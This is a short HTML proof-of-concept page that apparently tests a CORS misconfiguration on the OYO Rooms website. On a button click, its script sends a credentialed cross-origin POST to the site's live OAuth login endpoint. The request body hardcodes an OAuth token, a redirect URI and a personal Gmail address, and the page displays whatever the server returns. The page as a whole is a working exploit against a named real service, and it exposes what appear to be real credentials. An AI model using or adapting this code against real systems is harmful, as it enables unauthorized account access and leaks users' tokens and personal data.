<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OYO CORS PoC</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #111;
            color: #eee;
            padding: 30px;
        }

        button {
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
        }

        pre {
            margin-top: 20px;
            padding: 20px;
            background: #000;
            border-radius: 8px;
            white-space: pre-wrap;
            word-break: break-word;
        }
    </style>
</head>

<body>

<h1>OYO CORS PoC</h1>

<button onclick="sendRequest()">Send exact OAuth POST</button>

<pre id="result">Waiting...</pre>

<script>

async function sendRequest() {

    const result = document.getElementById("result");

    result.textContent = "Sending request...";

    /*
     * IMPORTANT:
     * Origin is automatically generated by the browser.
     *
     * If this page is hosted at:
     *
     * https://imperror.me/
     *
     * the browser will send:
     *
     * Origin: https://imperror.me
     */

    const body = JSON.stringify({
    "oauth_token":"4/0ATsMZqCKSmWuMGjvcssG6kgY33pIYYHpB9jjviTXmOZNO2LLjrq39yPjePP8FMgZ3lNURw",
        "redirect_uri":"https://www.oyorooms.com/login/gmail/",
        "mode":"GMAIL",
        "email":"maxabodwe9@gmail.com"
    });

    try {

        const response = await fetch(
            "https://www.oyorooms.com/api/pwa/slOauth?locale=en",
            {
                method: "POST",

                credentials: "include",

                headers: {
                    "Accept": "*/*",
                    "Content-Type": "text/plain;charset=UTF-8",

                    /*
                     * Put the CURRENT XSRF token from your
                     * own authenticated test session here.
                     *
                     * Do NOT publish it publicly.
                     */
                    "Xsrf-Token": "YOUR_CURRENT_XSRF_TOKEN"
                },

                body: body
            }
        );

        const text = await response.text();

        result.textContent =
            "CORS REQUEST COMPLETED\n\n" +
            "HTTP Status: " + response.status + "\n\n" +
            "Response:\n" +
            text;

        console.log("Status:", response.status);
        console.log("Response:", text);

    } catch (error) {

        result.textContent =
            "BROWSER BLOCKED THE REQUEST\n\n" +
            error.name + ": " + error.message;

        console.error(error);
    }
}

</script>

</body>
</html>
